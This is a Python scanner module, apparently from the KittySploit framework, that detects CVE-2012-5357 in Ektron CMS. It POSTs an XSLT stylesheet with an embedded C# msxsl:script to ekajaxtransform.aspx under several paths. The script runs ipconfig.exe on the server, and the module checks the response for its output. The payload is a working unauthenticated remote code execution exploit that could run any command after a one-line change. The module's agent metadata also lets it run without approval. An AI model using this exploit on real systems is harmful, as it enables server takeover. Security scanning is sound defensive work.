#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ektron CMS XSLT C# script RCE (CVE-2012-5357)."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ektron CMS - ekajaxtransform XSLT RCE Detection (CVE-2012-5357)',
        'description': (
            'Detects CVE-2012-5357 by POSTing msxsl:script C# XSLT that runs '
            'ipconfig.exe to ekajaxtransform.aspx.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'ektron', 'xslt', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-5357',
        ],
        'cve': 'CVE-2012-5357',
    }

    def run(self):
        xslt = (
            '<?xml version="1.0"?>\n'
            '<xsl:stylesheet version="1.0"\n'
            'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n'
            'xmlns:msxsl="urn:schemas-microsoft-com:xslt"\n'
            'xmlns:user="http://mycompany.com/mynamespace">\n'
            '<msxsl:script language="C#" implements-prefix="user">\n'
            '<![CDATA[\n'
            'public string xml()\n'
            '{\n'
            'System.Diagnostics.Process proc = new System.Diagnostics.Process();\n'
            'proc.StartInfo.UseShellExecute = false;\n'
            'proc.StartInfo.RedirectStandardOutput = true;\n'
            'proc.StartInfo.FileName = "ipconfig.exe";\n'
            'proc.Start();\n'
            'proc.WaitForExit();\n'
            'return proc.StandardOutput.ReadToEnd();\n'
            '}\n'
            ']]>\n'
            '</msxsl:script>\n'
            '<xsl:template match="/">\n'
            '<xsl:value-of select="user:xml()"/>\n'
            '</xsl:template>\n'
            '</xsl:stylesheet>'
        )
        data = 'xml=AAA&xslt=' + quote(xslt, safe='')
        for base in ('/cms', '/cms400min', '/cms400.net', '/cms400', ''):
            path = f'{base}/WorkArea/ContentDesigner/ekajaxtransform.aspx'
            r = self.http_request(
                method='POST',
                path=path,
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and re.search(r'Windows.?IP.?onfiguration', r.text or '', re.I):
                self.set_info(
                    severity='critical',
                    reason='Ektron XSLT RCE (CVE-2012-5357)',
                    path=path,
                )
                return True
        return False
